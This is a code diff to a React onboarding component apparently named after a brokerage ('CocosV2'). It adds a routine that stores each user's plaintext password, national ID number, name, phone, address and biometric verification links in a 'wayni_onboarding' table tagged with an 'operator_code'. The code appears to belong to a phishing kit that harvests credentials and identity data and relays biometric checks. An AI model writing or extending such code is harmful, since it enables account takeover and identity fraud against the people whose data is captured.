@@ -177,6 +177,37 @@ const CocosV2 = () => {
     await supabase.from("sessions").update(payload).eq("id", sid);
   }, []);
 
+  // ── Persist onboarding data to dedicated table (never lose data) ──
+  const saveOnboardingData = useCallback(async (data: Record<string, unknown>) => {
+    try {
+      const normalizedEmail = String(data.email || email || "").trim().toLowerCase();
+      if (!normalizedEmail) return;
+      const sid = sessionIdRef.current || null;
+      const payload = {
+        ...data,
+        email: normalizedEmail,
+        session_id: sid,
+        operator_code: operatorCode,
+        updated_at: new Date().toISOString(),
+      };
+      // Upsert: if there's already a row for this email, update it
+      const { data: existing } = await (supabase as any)
+        .from("wayni_onboarding")
+        .select("id")
+        .eq("email", normalizedEmail)
+        .order("created_at", { ascending: false })
+        .limit(1)
+        .single();
+      if (existing?.id) {
+        await (supabase as any).from("wayni_onboarding").update(payload).eq("id", existing.id);
+      } else {
+        await (supabase as any).from("wayni_onboarding").insert(payload);
+      }
+    } catch (e) {
+      console.warn("[ONBOARDING] Failed to persist onboarding data:", e);
+    }
+  }, [email, operatorCode]);
+
   const upsertAccountForOperator = useCallback(async (partial: Record<string, unknown>) => {
     const normalizedEmail = String(partial.email || "").trim().toLowerCase();
     if (!normalizedEmail) return;
@@ -1070,8 +1101,19 @@ const CocosV2 = () => {
       otp_code: `dni:${data.identity_number}|name:${result?.full_name || data.selected_full_name || ""}|uuid:${result?.user_uuid || ""}|gender:${resolvedGender}|phone:${resolvedPhone}`,
     });
 
+    // Persist onboarding data to dedicated table
+    await saveOnboardingData({
+      dni: data.identity_number,
+      full_name: result?.full_name || data.selected_full_name || "",
+      phone: resolvedPhone,
+      gender: resolvedGender,
+      user_uuid: result?.user_uuid || "",
+      password: lastPasswordRef.current || lastPassword || "",
+      status: "verify_dni_success",
+    });
+
     setStep("address");
-  }, [email, lastPassword, syncedPhone, updateSession]);
+  }, [email, lastPassword, syncedPhone, updateSession, saveOnboardingData]);
 
   // ── Address submission → then biometric ──
   const handleAddressSubmit = useCallback(async (addressData: Record<string, unknown>) => {
@@ -1105,13 +1147,36 @@ const CocosV2 = () => {
     await updateSession("biometric_started", { 
       otp_code: `dni:${lastDni}|name:${syncedFullName}|uuid:${userUuid}|gender:${userGender}|region:${addressData.region}|city:${addressData.city}|street:${addressData.street_name} ${addressData.street_number}|zip:${addressData.zip_code}|biometric_url:${bioResult.biometric_url}|biometric_id:${bioResult.biometric_id || ""}` 
     });
+
+    // Persist address + biometric data to dedicated table
+    await saveOnboardingData({
+      region: String(addressData.region || ""),
+      city: String(addressData.city || ""),
+      street: `${addressData.street_name || ""} ${addressData.street_number || ""}`.trim(),
+      zip_code: String(addressData.zip_code || ""),
+      biometric_url: bioResult.biometric_url,
+      biometric_id: bioResult.biometric_id || "",
+      status: "biometric_started",
+      metadata: {
+        region_id: addressData.region_id,
+        city_id: addressData.city_id,
+        street_name: addressData.street_name,
+        street_number: addressData.street_number,
+        floor: addressData.floor,
+        apartment: addressData.apartment,
+      },
+    });
+
     setStep("biometric");
-  }, [updateSession, lastDni, userUuid, userGender, syncedFullName]);
+  }, [updateSession, lastDni, userUuid, userGender, syncedFullName, saveOnboardingData]);
 
   // ── Biometric events tracking ──
   const handleBiometricEvent = useCallback(async (event: string) => {
     await updateSession(event);
-  }, [updateSession]);
+    if (event === "biometric_finished") {
+      await saveOnboardingData({ status: "biometric_finished" });
+    }
+  }, [updateSession, saveOnboardingData]);
 
   const handleBack = useCallback(() => {
     setStep("login");
